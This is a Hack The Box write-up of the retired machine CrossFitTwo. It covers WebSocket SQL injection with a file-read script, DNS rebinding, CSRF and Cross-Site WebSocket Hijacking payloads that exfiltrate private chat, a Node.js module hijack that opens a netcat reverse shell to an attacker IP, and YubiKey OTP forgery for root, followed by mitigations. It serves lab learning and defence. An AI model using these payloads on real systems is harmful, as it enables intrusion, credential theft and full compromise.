---
title: "Hack The Box — CrossFitTwo"
summary: "CrossFitTwo chains WebSocket SQL injection, DNS rebinding, CSWSH, Node.js module hijacking and YubiKey OTP forgery to achieve full OpenBSD root access."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Insane"
os: "Other"
solvedAt: 2026-09-06
publishedAt: 2026-09-06
tags:
  - openbsd
  - websocket-sqli
  - arbitrary-file-read
  - unbound
  - dns-rebinding
  - host-header-injection
  - cors
  - cswsh
  - nodejs-module-hijacking
  - suid
  - yubikey
tools:
  - Nmap
  - curl
  - Python
  - websockets
  - Burp Suite
  - Unbound
  - tcpdump
  - dnslib
  - PHP
  - Netcat
  - SSH
  - Node.js
  - ykgenerate
cves: []
htbUrl: "https://app.hackthebox.com/machines/CrossFitTwo"
cover: "/images/writeups/hackthebox/machines/crossfittwo/crossfittwo.png"
coverAlt: "Hack The Box CrossFitTwo machine artwork showing an athlete bending a barbell"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box machine CrossFitTwo. Flags, session tokens, cookies, VPN addresses, SSH private-key material and unrelated personal data have been removed. Credentials shown below belong only to the retired lab and are included where they explain the attack path.

## About this write-up

This is a reconstruction of my actual solve on 6 September 2026. It follows the order in which I enumerated the target, broke the WebSocket application, recovered the proxy and DNS configuration, abused an administrator's browser, moved from `david` to `john`, and finally authenticated as root with a generated YubiKey OTP.

Most commands and decisive outputs below come directly from my terminal history and the Codex session used during the solve. The DNS-rebinding and CSWSH snippets are shortened equivalents of the pages used in the lab; their observed DNS, HTTP, Socket.IO and exfiltration results were verified live. After obtaining the `john` shell, I used public retired-machine reference material to confirm the intended `log`/YubiKey direction, then executed and verified that chain end to end.

The target and VPN addresses were session-specific, so this article uses `<TARGET_IP>` and `<ATTACKER_IP>`.

## Machine information

| Item | Value |
| --- | --- |
| Machine | CrossFitTwo |
| Platform | Hack The Box |
| Content status | Retired |
| Difficulty | Insane |
| Operating system | OpenBSD 7.4 |
| Solved | 6 September 2026 |

Hack The Box's public machine page marks CrossFitTwo as a **Retired Machine**, which satisfies the publication policy for this write-up.

## Executive summary

The public gym site exposed a WebSocket endpoint whose membership lookup concatenated the client-controlled `params` value into a MariaDB query. A two-column UNION injection revealed that the database account had the `FILE` privilege, turning SQL injection into arbitrary file read. Reading `relayd.conf` disclosed the hidden `crossfit-club.htb` portal, while the Unbound configuration exposed the paths of its remote-control certificates and key.

With those files, I authenticated to the exposed Unbound control service and created a DNS route for an attacker-controlled hostname. A weak CORS origin check, permissive relayd Host matching and a password-reset link built from the Host header enabled a DNS-rebinding attack against an administrator. The first browser payload registered a portal account; the second performed Cross-Site WebSocket Hijacking and exfiltrated a private chat containing `david`'s SSH password.

As `david`, membership of the `sysadmins` group allowed writes beneath `/opt/sysadmin`. A scheduled Node.js script loaded packages through the normal `node_modules` search order, so a malicious local `ws` module executed as `john`. The `staff` group then exposed a setuid root log reader that could read privileged files under `/var`, including a backup of root's SSH key and the YubiKey state. I generated the next valid OTP and completed SSH's required public-key-plus-password authentication as root.

## Attack path

| Stage | Confirmed result |
| --- | --- |
| Service enumeration | OpenSSH, OpenBSD httpd/PHP and Unbound remote control |
| Web enumeration | `employees.crossfit.htb` and `gym.crossfit.htb` |
| WebSocket SQL injection | Two-column UNION injection and MariaDB metadata disclosure |
| Arbitrary file read | `FILE` privilege plus `LOAD_FILE()` |
| Hidden infrastructure | `relayd.conf`, `httpd.conf` and `unbound.conf` recovered |
| DNS control | Authenticated `unbound-control` access using recovered client material |
| Browser pivot | Host-header injection plus DNS rebinding reached the administrator's browser |
| Portal access | Administrator's authenticated API registered a controlled account |
| CSWSH | Private Socket.IO chat exfiltrated `david`'s lab password |
| Initial shell | SSH access as `david` and user-level completion |
| Lateral movement | Node.js package-resolution hijack executed as `john` |
| Privileged read | Setuid `log` binary read root-owned files beneath `/var` |
| Root | Root SSH key plus generated YubiKey OTP satisfied MFA |

## 1. Initial enumeration

I began with a full TCP scan and default version/script detection:

```bash
nmap <TARGET_IP> -T5 -sVC -p-
```

The useful results were:

```text
22/tcp   open  ssh                 OpenSSH 9.5
80/tcp   open  http                OpenBSD httpd / PHP 7.4.12
8953/tcp open  ssl/ub-dns-control  certificate CN=unbound
```

Port `8953` was unusual. It is the conventional TLS remote-control port for Unbound, but the service still required its client certificate and private key. At this stage it was an interesting lead rather than an immediate entry point.

### Virtual hosts and the WebSocket endpoint

Virtual-host enumeration identified `employees.crossfit.htb`. The public site's JavaScript independently disclosed a second name:

```bash
curl -s "http://<TARGET_IP>/js/ws.min.js" | grep -oE 'ws://[^"]+'
```

```text
ws://gym.crossfit.htb/ws/
```

I added the names to `/etc/hosts` and compared their responses:

```bash
curl -s -o /dev/null -w 'IP: %{http_code} %{size_download}\n' \
  "http://<TARGET_IP>/"
curl -s -o /dev/null -w 'employees: %{http_code} %{size_download}\n' \
  http://employees.crossfit.htb/
curl -s -o /dev/null -w 'gym: %{http_code} %{size_download}\n' \
  http://gym.crossfit.htb/
```

```text
IP: 200 19041
employees: 200 4412
gym: 200 19041
```

The `gym` root returned the default site, but its `/ws/` route was distinct. This was a useful reminder that response-size filtering during vhost fuzzing can miss a hostname whose root path is intentionally identical to the default host.

## 2. WebSocket token handling and SQL injection

I connected interactively with the Python `websockets` client:

```bash
python3 -m websockets ws://gym.crossfit.htb/ws/
```

The server returned a greeting and a token. Every valid response issued a new token, and the next request had to use that exact value:

```json
{"message":"help","token":"<CURRENT_TOKEN>"}
```

```text
Available commands:
- coaches
- classes
- memberships
```

The `memberships` command generated buttons that eventually sent a message named `available` with a numeric `params` value. My first attempts failed because a visually wrapped token was copied incorrectly, and another request reused a stale token:

```text
{"status":"500","message":"incorrect or missing token"}
```

Once I used the newly returned token, a Boolean expression changed the result:

```json
{"message":"available","params":"3 or 1=1","token":"<CURRENT_TOKEN>"}
```

```text
Good news! This membership plan is available.
debug: [id: 1, name: 1-month]
```

That established SQL injection in `params`. A two-column UNION fit the debug output:

```text
3 union select 1,2
```

```text
debug: [id: 1, name: 2]
```

I then fingerprinted the database context:

```text
3 union select user(),database()
3 union select version(),@@hostname
3 union select group_concat(schema_name),2
  from information_schema.schemata
```

```text
crossfit_user@localhost | crossfit
10.9.6-MariaDB        | crossfit2.htb
information_schema,crossfit,employees
```

The `employees` schema contained two tables:

```text
3 union select group_concat(table_name),2
  from information_schema.tables
  where table_schema='employees'
```

```text
employees,password_reset
```

The employee records disclosed usernames and email addresses, including the administrator identity `david.palmer@crossfit.htb`. Password hashes were recovered during the solve but are omitted because they were not needed for the successful path.

### From SQL injection to arbitrary file read

The decisive privilege query returned `FILE`:

```text
3 union select group_concat(privilege_type),2
  from information_schema.user_privileges
```

```text
debug: [id: FILE, name: 2]
```

I validated `LOAD_FILE()` against `/etc/passwd`. The response exposed the OpenBSD accounts `david`, `john`, `node` and `lucille`, proving that the database process could read host files.

Large multiline files were awkward inside the JSON debug field, so I created `ws_read.py`. It obtains a fresh token, base64-encodes the remote file inside MariaDB, and decodes the result locally:

```python
#!/usr/bin/env python3
import asyncio
import base64
import json
import sys
import websockets

URL = "ws://gym.crossfit.htb/ws/"

async def recv_json(ws):
    while True:
        message = await ws.recv()
        if message == "ping":
            await ws.send("pong")
            continue
        return json.loads(message)

async def main():
    remote_path = sys.argv[1]

    async with websockets.connect(URL, max_size=None) as ws:
        hello = await recv_json(ws)
        injection = (
            "3 union select "
            f"to_base64(load_file('{remote_path}')),2 "
            "from information_schema.user_privileges"
        )
        await ws.send(json.dumps({
            "message": "available",
            "params": injection,
            "token": hello["token"],
        }))
        response = await recv_json(ws)
        encoded = response["debug"][len("[id: "):-len(", name: 2]")]
        sys.stdout.buffer.write(base64.b64decode(encoded))

asyncio.run(main())
```

## 3. Reading the OpenBSD routing configuration

The first high-value target was relayd:

```bash
python3 ws_read.py /etc/relayd.conf
```

The important rules were:

```text
pass request quick header "Host" value "*crossfit-club.htb" forward to <3>
pass request quick header "Host" value "*employees.crossfit.htb" forward to <2>
match request path "/ws*" forward to <4>

relay web {
    listen on "0.0.0.0" port 80
    forward to <1> port 8000
    forward to <2> port 8001
    forward to <3> port 9999
    forward to <4> port 4419
}
```

This disclosed the hidden `crossfit-club.htb` portal and explained why `/ws/` behaved differently on the `gym` hostname. A second internal relay sent portal API traffic to port `5000` on four loopback addresses using source hashing.

`/etc/httpd.conf` confirmed three local frontends:

```text
0.0.0.0:8000  /htdocs
employees:8001 /htdocs_employees
chat:8002      /htdocs_chat
```

The portal was reachable publicly by adding `crossfit-club.htb` to `/etc/hosts`. Its signup interface was disabled, and the API enforced the same policy:

```bash
curl -s -c club.cookies http://crossfit-club.htb/api/auth \
  | tee auth.json | jq

TOKEN=$(jq -r '.token' auth.json)

curl -s -b club.cookies -X POST \
  -H "X-CSRF-TOKEN: $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{}' \
  http://crossfit-club.htb/api/signup | jq
```

```json
{
  "success": "false",
  "message": "Only administrators can register accounts."
}
```

We therefore needed the administrator's authenticated browser rather than a direct unauthenticated API call.

## 4. Taking control of the Unbound resolver

The file read also recovered `/var/unbound/etc/unbound.conf`. Its remote-control section exposed the exact TLS paths:

```text
control-interface: 0.0.0.0
control-use-cert: yes
server-cert-file: "/var/unbound/etc/tls/unbound_server.pem"
control-key-file: "/var/unbound/etc/tls/unbound_control.key"
control-cert-file: "/var/unbound/etc/tls/unbound_control.pem"
```

I downloaded the server certificate, client certificate and client private key:

```bash
mkdir -p loot/unbound

python3 ws_read.py /var/unbound/etc/tls/unbound_server.pem \
  > loot/unbound/unbound_server.pem
python3 ws_read.py /var/unbound/etc/tls/unbound_control.pem \
  > loot/unbound/unbound_control.pem
python3 ws_read.py /var/unbound/etc/tls/unbound_control.key \
  > loot/unbound/unbound_control.key

chmod 600 loot/unbound/unbound_control.key
```

OpenSSL confirmed that the certificate subjects were `unbound` and `unbound-control`, and that the recovered private key was valid. After creating a minimal local client configuration pointing to those files, I authenticated to the exposed service:

```bash
unbound-control \
  -c "$PWD/loot/unbound/client.conf" \
  -s "<TARGET_IP>@8953" \
  status
```

```text
version: 1.18.0
verbosity: 1
threads: 1
modules: 2 [ validator iterator ]
options: control(ssl)
unbound is running...
```

This was not only information disclosure. It allowed live modification of the resolver used by the target.

## 5. CORS, Host matching and DNS rebinding

I tested the portal API's CORS behavior with several Origin values:

```bash
for origin in \
  gym.crossfit.htb \
  employees.crossfit.htb \
  gymxcrossfit.htb \
  random.crossfit.htb
do
  echo "=== $origin ==="
  curl -si -X OPTIONS \
    -H "Origin: http://$origin" \
    -H 'Access-Control-Request-Method: GET' \
    http://crossfit-club.htb/api/auth \
    | grep -iE 'access-control-allow-origin|access-control-allow-credentials'
done
```

```text
gym.crossfit.htb:       allowed with credentials
employees.crossfit.htb: allowed with credentials
gymxcrossfit.htb:       allowed with credentials
random.crossfit.htb:    credentials only; origin not allowed
```

`gymxcrossfit.htb` was not a legitimate application hostname, yet it passed the origin validation. It also ended with the wildcard text expected by relayd. I instructed the target's Unbound resolver to forward that hostname to my DNS server:

```bash
unbound-control \
  -c "$PWD/loot/unbound/client.conf" \
  -s "<TARGET_IP>@8953" \
  forward_add +i gymxcrossfit.htb "<ATTACKER_IP>@53"
```

My DNS service returned `127.0.0.1` for the first two A queries and `<ATTACKER_IP>` for later queries, with a zero TTL. The observed sequence was:

```text
[1] <TARGET_IP> asked for gymxcrossfit.htb -> 127.0.0.1
[2] <TARGET_IP> asked for gymxcrossfit.htb -> 127.0.0.1
[3] <TARGET_IP> asked for gymxcrossfit.htb -> <ATTACKER_IP>
```

The first resolution let the administrator's browser treat the origin as a local, trusted route through relayd. A later resolution sent requests for the same origin to my web server without changing the browser's origin tuple.

### Triggering the administrator

The employee password-reset form built its link from the supplied Host header. This deliberately malformed header satisfied both routing patterns at different stages:

```bash
curl -s -X POST \
  -H 'Host: gymxcrossfit.htb/employees.crossfit.htb' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: http://employees.crossfit.htb/password-reset.php' \
  --data-binary 'email=david.palmer%40crossfit.htb' \
  http://employees.crossfit.htb/password-reset.php
```

```text
Reset link sent, please check your email.
```

I ran the attack services in this order:

1. The web server on TCP 80.
2. The exfiltration listener on TCP 81.
3. The DNS-rebinding server on UDP 53.
4. The Unbound forwarding rule.
5. The password-reset trigger.

### A delivery failure that mattered

My first listener used Python's static server:

```bash
sudo python3 -m http.server 80 --directory webroot
```

The administrator fetched `/password-reset.php?token=...`, but the browser received the PHP file as a static/octet-stream response instead of executable HTML. DNS rebinding was working; payload delivery was not.

Switching to PHP's development server corrected the content handling:

```bash
sudo php -S 0.0.0.0:80 -t webroot
```

The next callback loaded the page successfully. The payload first fetched `/api/auth` with the victim's cookies, extracted the CSRF token, and called the administrator-only signup endpoint. The account values below are sanitized equivalents of the ones used during the solve:

```javascript
const auth = await fetch("http://crossfit-club.htb/api/auth", {
  credentials: "include"
}).then(response => response.json());

await fetch("http://crossfit-club.htb/api/signup", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json",
    "X-CSRF-TOKEN": auth.token
  },
  body: JSON.stringify({
    username: "researcher",
    email: "researcher@developer.htb",
    password: "<LAB_PASSWORD>",
    confirm: "<LAB_PASSWORD>"
  })
});
```

The callback to the exfiltration listener proved that the request ran with administrator privileges:

```json
{"success":"true","message":"User registered successfully!"}
```

## 6. Cross-Site WebSocket Hijacking

After logging into the portal with the newly registered account, Burp showed a Socket.IO 2.x/Engine.IO 3 polling connection under `/socket.io/`. The chat contained users including `Admin`, but my account could not read the administrator's private history directly.

I reused the same rebinding chain with a second browser payload. The page loaded the portal's Socket.IO client, opened a credentialed connection in the administrator's browser, joined as `Admin`, and sent received private messages to my server. The relevant shortened logic was:

```html
<script src="http://crossfit-club.htb/socket.io/socket.io.js"></script>
<script>
const socket = io("http://crossfit-club.htb", {
  transports: ["polling"],
  withCredentials: true
});

socket.on("connect", () => {
  socket.emit("user_join", { username: "Admin" });
});

socket.on("private_recv", message => {
  fetch("/exfil/" + btoa(JSON.stringify(message)));
});
</script>
```

The PHP server logged repeated requests such as:

```text
GET /exfil/<BASE64_MESSAGE>
```

Decoding the message produced the credential needed for the host:

```json
{
  "sender_id": 2,
  "content": "Hello David, I've added a user account for you with the password `NWBFcSe3ws4VDhTB`.",
  "roomId": 2
}
```

This was a Cross-Site WebSocket Hijacking result even though the transport initially appeared as HTTP polling: the attacker-controlled origin caused the victim's authenticated real-time client to join and disclose a private channel.

## 7. SSH foothold as david

The recovered lab password worked over SSH:

```bash
ssh david@<TARGET_IP>
```

```text
OpenBSD 7.4
uid=1004(david) gid=1004(david) groups=1004(david),1003(sysadmins)
hostname: crossfit2.htb
```

The user flag was recovered from `/home/david/user.txt`; its value is intentionally omitted.

Local enumeration found a scheduled Node.js application:

```sh
find /opt -maxdepth 6 -type f -ls 2>/dev/null
find /opt -maxdepth 6 -type d -ls 2>/dev/null
ps auxww | grep -E 'node|statbot|npm' | grep -v grep
```

```text
/opt/sysadmin/server/statbot/statbot.js
/opt/sysadmin                  root:sysadmins  group-writable
/opt/sysadmin/server/statbot   root:wheel
```

The script imported three modules and wrote a health status to `/tmp/chatbot.log`:

```javascript
const WebSocket = require('ws');
const fs = require('fs');
const logger = require('log-to-file');
const ws = new WebSocket("ws://gym.crossfit.htb/ws/");
```

`/tmp/chatbot.log` was owned by `john` and updated every minute. That linked the script to a scheduled process running as another user.

## 8. Node.js module-resolution hijacking

Node.js resolves a non-core package by searching `node_modules` directories from the importing file's directory upward before falling back to global paths such as `NODE_PATH`. Because `david` could write `/opt/sysadmin`, I could place a higher-priority package at:

```text
/opt/sysadmin/node_modules/<package>/index.js
```

### First attempt: an SSH authorized key

I initially replaced `log-to-file` with a module that created `/home/john/.ssh/authorized_keys` and wrote its effective UID to a marker file. After copying it to the target:

```sh
mkdir -p /opt/sysadmin/node_modules/log-to-file
cp /tmp/index.js /opt/sysadmin/node_modules/log-to-file/index.js

cd /opt/sysadmin/server/statbot
NODE_PATH=/usr/local/lib/node_modules \
  node -p "require.resolve('log-to-file')"
```

```text
/opt/sysadmin/node_modules/log-to-file/index.js
```

The scheduled process executed it:

```text
/tmp/john_module_ran: uid=1005
```

However, `ssh -i john_ed25519 john@<TARGET_IP>` still prompted for a password. The code-execution primitive was valid, but an authorized key was not a usable login path under the target's SSH authentication policy.

### Working attempt: reverse shell from the `ws` package

I changed the hijacked package to `ws` and used the scheduled execution to open a callback:

```sh
mkdir -p /opt/sysadmin/node_modules/ws
vi /opt/sysadmin/node_modules/ws/index.js
```

```javascript
require('child_process').execSync(
  'rm -f /tmp/jf;mkfifo /tmp/jf;' +
  'cat /tmp/jf|/bin/sh -i 2>&1|nc <ATTACKER_IP> 443 >/tmp/jf'
);
```

Resolution again selected the controlled module:

```sh
cd /opt/sysadmin/server/statbot
NODE_PATH=/usr/local/lib/node_modules node -p "require.resolve('ws')"
```

```text
/opt/sysadmin/node_modules/ws/index.js
```

With a listener waiting on Kali, the scheduled task connected back:

```bash
sudo nc -lvnp 443
```

```text
uid=1005(john) gid=1005(john) groups=1005(john),20(staff),1003(sysadmins)
```

The lateral movement succeeded because a privileged scheduled process imported packages from a directory writable by a less-privileged group.

## 9. Setuid file read as john

The new `staff` group exposed one important binary:

```sh
find / -group staff -type f -ls 2>/dev/null
ls -l /usr/local/bin/log
file /usr/local/bin/log
```

```text
-rwsr-s---  1 root  staff  9024  /usr/local/bin/log
ELF 64-bit LSB shared object, x86-64
```

`log` was setuid root and could read files that `john` could not access directly. Its OpenBSD `unveil` restriction limited it to `/var`, but that boundary still included two highly sensitive locations:

- `/var/db/yubikey`, containing root's OTP state.
- `/var/backups`, containing daily security backups of files listed in `/etc/changelist`.

### Recovering the YubiKey state

I read the three root records:

```sh
/usr/local/bin/log /var/db/yubikey/root.key
/usr/local/bin/log /var/db/yubikey/root.uid
/usr/local/bin/log /var/db/yubikey/root.ctr
```

```text
root.key: 6bf9a26475388ce998988b67eaa2ea87
root.uid: a4ce1128bde4
root.ctr: 985089
```

The current state `985089` is hexadecimal `0f0801`. The next accepted combined value is therefore `985090`, or `0f0802`: counter `0f08` and session-use byte `02`.

### Recovering root's SSH key

OpenBSD's security backups replace path separators with underscores and append `.current`. The root SSH private key was available at:

```sh
/usr/local/bin/log /var/backups/root_.ssh_id_rsa.current \
  | sed -n '/BEGIN OPENSSH PRIVATE KEY/,/END OPENSSH PRIVATE KEY/p'
```

The key body is deliberately omitted. After saving it locally, I verified its format:

```bash
chmod 600 root_id_rsa
ssh-keygen -y -f root_id_rsa >/dev/null && echo 'KEY VALID'
```

```text
KEY VALID
```

## 10. Generating the YubiKey OTP and becoming root

On Kali, the Debian/Kali `libyubikey-dev` package supplied `ykgenerate` and `ykparse`:

```bash
sudo apt install -y libyubikey-dev
command -v ykgenerate
```

```text
/usr/bin/ykgenerate
```

I generated the next token from the recovered AES key, internal UID, counter and session-use value. The low and high timestamps were set to zero:

```bash
OTP=$(ykgenerate \
  6bf9a26475388ce998988b67eaa2ea87 \
  a4ce1128bde4 \
  0f08 \
  0000 \
  00 \
  02)

ykparse 6bf9a26475388ce998988b67eaa2ea87 "$OTP"
```

The validation output matched the target state:

```text
uid: a4 ce 11 28 bd e4
counter: 3848 (0x0f08)
timestamp (low): 0 (0x0000)
timestamp (high): 0 (0x00)
session use: 2 (0x02)
crc check: ok
```

Root SSH required both the recovered private key and the YubiKey-generated password:

```bash
ssh -i ./root_id_rsa root@<TARGET_IP>
```

After pasting the generated one-time code at the password prompt:

```text
uid=0(root) gid=0(wheel)
pwd: /root
```

The root flag was recovered from `/root/root.txt`; its value is intentionally omitted.

## What did not work

| Attempt | Observed failure | Adjustment |
| --- | --- | --- |
| Copying a wrapped WebSocket token | `incorrect or missing token` | Used the exact token from the latest response |
| Reusing a previous token | Same 500 response | Treated tokens as single-step rotating state |
| Password-reset table query with a stale token | Query rejected before SQL execution | Repeated it with the newly returned token |
| Serving the rebinding payload with `python3 -m http.server` | Browser fetched PHP as static/octet-stream content | Switched to `php -S 0.0.0.0:80 -t webroot` |
| Expecting the first DNS answer to reach Kali | Initial A queries returned loopback as designed | Waited for the later zero-TTL resolution to return `<ATTACKER_IP>` |
| Adding an SSH key for `john` | Module ran as UID 1005, but SSH requested a password | Used the same module primitive for a reverse shell |
| Typing placeholder OTP values | Shell arithmetic reported an invalid constant | Re-read and substituted the real `root.key`, `root.uid` and numeric `root.ctr` values |

These failures were useful because each isolated a different layer: WebSocket state, SQL execution, HTTP content delivery, DNS timing, SSH policy and OTP construction.

## Key takeaways

- **Follow configuration data, not only web content.** The file-read primitive became far more valuable when aimed at `relayd.conf` and `unbound.conf` rather than user files.
- **Stateful protocols punish casual copying.** A correct SQL payload still failed whenever the WebSocket token was stale or visually corrupted.
- **DNS rebinding is a multi-layer chain.** DNS answer order, TTL, browser origin rules, relayd Host matching, CORS and authenticated cookies all had to align.
- **Delivery is part of exploitation.** The Python server did receive the request, but the wrong response type prevented browser execution. The PHP server fixed the actual failure.
- **Module resolution is a trust boundary.** A root-owned script is not safe when it imports code from a group-writable ancestor directory.
- **A sandbox boundary can still contain secrets.** Restricting a privileged reader to `/var` did not protect `/var/backups` or `/var/db/yubikey`.
- **MFA depends on protecting state.** The OTP algorithm remained secure cryptographically; disclosure of the AES key, token UID and counter made offline generation possible.

## Mitigations

| Weakness | Defensive action |
| --- | --- |
| WebSocket SQL injection | Use parameterized queries and strict numeric validation for membership IDs |
| Debug data returned to clients | Remove database rows and internal errors from production responses |
| MariaDB `FILE` privilege | Revoke it from application accounts and constrain `secure_file_priv` |
| Readable routing and TLS-control secrets | Apply least-privilege filesystem permissions and separate database/web identities |
| Exposed Unbound remote control | Bind control locally or to a management network; rotate compromised certificates and keys |
| Weak CORS origin validation | Compare parsed origins against an exact allowlist; never use permissive suffix regexes with credentials |
| Host-header password reset | Generate reset links from a fixed trusted base URL and reject malformed Host values |
| DNS rebinding | Validate expected hostnames server-side and avoid exposing privileged loopback applications through browser-reachable routes |
| CSWSH / Socket.IO session abuse | Validate `Origin` during the handshake, bind socket identity to the authenticated session, and authorize every room join |
| Writable Node.js search path | Make every ancestor and `node_modules` directory root-owned and non-writable; use locked absolute deployment paths |
| Setuid log reader | Remove setuid, use a narrow privileged service, canonicalize/allowlist files, and exclude sensitive backup/state directories |
| YubiKey seed exposure | Protect seed, UID and counter with root-only access; rotate the token state after suspected disclosure |
| Root SSH key backup | Encrypt sensitive backups, restrict `/var/backups`, and avoid backing up unprotected root private keys |

## Tools used

| Tool | Purpose |
| --- | --- |
| Nmap | Full TCP and service enumeration |
| curl | Host comparison, CORS testing, API interaction and password-reset triggering |
| Python `websockets` | Manual WebSocket interaction and SQL injection |
| `ws_read.py` | Reliable base64 arbitrary-file extraction |
| Burp Suite | Portal and Socket.IO traffic inspection |
| OpenSSL | Certificate and private-key validation |
| `unbound-control` | Authenticated resolver status and forwarding changes |
| dnslib / tcpdump | DNS-rebinding service and query observation |
| PHP development server | Executable browser-payload delivery |
| Netcat | Exfiltration and reverse-shell listeners |
| SSH | Initial access as `david` and final root authentication |
| Node.js | Package-resolution verification and lateral movement |
| `log` | Privileged reads beneath `/var` |
| `ykgenerate` / `ykparse` | YubiKey OTP creation and validation |

## References

- [Hack The Box — CrossFitTwo retired machine](https://www.hackthebox.com/machines/crossfittwo)
- [MariaDB `LOAD_FILE()` documentation](https://mariadb.com/docs/server/reference/sql-functions/string-functions/load_file)
- [OpenBSD `relayd.conf(5)`](https://man.openbsd.org/relayd.conf)
- [Unbound `unbound-control(8)`](https://unbound.docs.nlnetlabs.nl/en/latest/manpages/unbound-control.html)
- [Node.js CommonJS module loading](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [OpenBSD `unveil(2)`](https://man.openbsd.org/unveil.2)
- [OpenBSD `security(8)`](https://man.openbsd.org/security.8)
- [OpenBSD `sshd_config(5)` — AuthenticationMethods](https://man.openbsd.org/sshd_config.5#AuthenticationMethods)
- [Yubico low-level C library and OTP utilities](https://github.com/Yubico/yubico-c)
- [0xdf CrossFitTwo analysis](https://0xdf.gitlab.io/2021/08/14/htb-crossfittwo.html) — consulted after the `john` shell to confirm the intended privileged-read and YubiKey path

[Return to all write-ups](/writeups/)
